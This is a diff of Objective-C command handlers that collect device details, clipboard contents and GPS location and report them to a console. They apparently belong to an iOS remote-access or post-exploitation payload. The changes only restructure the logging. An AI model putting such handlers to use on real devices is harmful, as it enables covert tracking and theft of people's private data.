@@ -38,20 +38,23 @@
 -(void)cmd_sysinfo {
     UIDevice* device = [UIDevice currentDevice];
     int batinfo = ([_thisUIDevice batteryLevel] * 100);
-    NSString* info = [NSString stringWithFormat:@"Model: %@\nBattery: %d\nVersion: %@\nName: %@\nUUID: %@\n",
-                      [device model], batinfo, [device systemVersion], [device name],
-                      [[device identifierForVendor] UUIDString]];
-    [console console_log:info];
+
+    [console console_log_information:[NSString stringWithFormat:@"Model: %@\n", [device model]]];
+    [console console_log_information:[NSString stringWithFormat:@"Battery: %d\n", batinfo]];
+    [console console_log_information:[NSString stringWithFormat:@"Version: %@\n", [device systemVersion]]];
+    [console console_log_information:[NSString stringWithFormat:@"Name: %@\n", [device name]]];
+    [console console_log_information:[NSString stringWithFormat:@"UUID: %@\n", [[device identifierForVendor] UUIDString]]];
 }
 
 -(void)cmd_getpid {
     NSProcessInfo* processInfo = [NSProcessInfo processInfo];
     int processID = [processInfo processIdentifier];
-    [console console_log:[NSString stringWithFormat:@"%d\n", processID]];
+    [console console_log_information:[NSString stringWithFormat:@"PID: %d\n", processID]];
 }
 
 -(void)cmd_getpaste {
     UIPasteboard* pb = [UIPasteboard generalPasteboard];
+    [console console_log_information:@"Pasteboard:\n"];
     if ([pb.strings count] > 1) {
         NSUInteger count = 0;
         for (NSString* pstring in pb.strings){
@@ -64,15 +67,15 @@
 
 -(void)cmd_battery {
     int batteryLevelLocal = ([_thisUIDevice batteryLevel] * 100);
-    NSString *info = [NSString stringWithFormat:@"Battery level: %d%%\nDevice is%@charging\n",
-                      batteryLevelLocal, [_thisUIDevice batteryState] == UIDeviceBatteryStateCharging ? @" " : @" not "];
-    [console console_log:info];
+    NSString *info = [NSString stringWithFormat:@"Battery level: %d (%@charging)\n",
+                      batteryLevelLocal, [_thisUIDevice batteryState] == UIDeviceBatteryStateCharging ? @" " : @"not "];
+    [console console_log_information:info];
 }
 
 -(void)cmd_getvol {
     [[AVAudioSession sharedInstance] setActive:YES error:nil];
     [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
-    [console console_log:[NSString stringWithFormat:@"%.2f\n", [AVAudioSession sharedInstance].outputVolume]];
+    [console console_log_information:[NSString stringWithFormat:@"Volume level: %.2f\n", [AVAudioSession sharedInstance].outputVolume]];
 }
 
 -(void)cmd_locate {
@@ -80,11 +83,14 @@
     [manager startUpdatingLocation];
     CLLocation* location = [manager location];
     CLLocationCoordinate2D coordinate = [location coordinate];
-    NSString* result = [NSString stringWithFormat:@"Latitude: %f\nLongitude: %f\nMap: http://maps.google.com/maps?q=%f,%f\n", coordinate.latitude, coordinate.longitude, coordinate.latitude, coordinate.longitude];
-    if ((int)(coordinate.latitude + coordinate.longitude) == 0) {
-        result = @"Unable to get device location!\n";
+
+    if ((int)(coordinate.latitude + coordinate.longitude) == 0)
+        [console console_log_error:@"Unable to get device location!\n"];
+    else {
+        [console console_log_information:[NSString stringWithFormat:@"Latitude: %f\n", coordinate.latitude]];
+        [console console_log_information:[NSString stringWithFormat:@"Longitude: %f\n", coordinate.longitude]];
+        [console console_log_information:[NSString stringWithFormat:@"Map: http://maps.google.com/maps?q=%f,%f\n", coordinate.latitude, coordinate.longitude]];
     }
-    [console console_log:result];
 }
 
 -(void)cmd_vibrate {
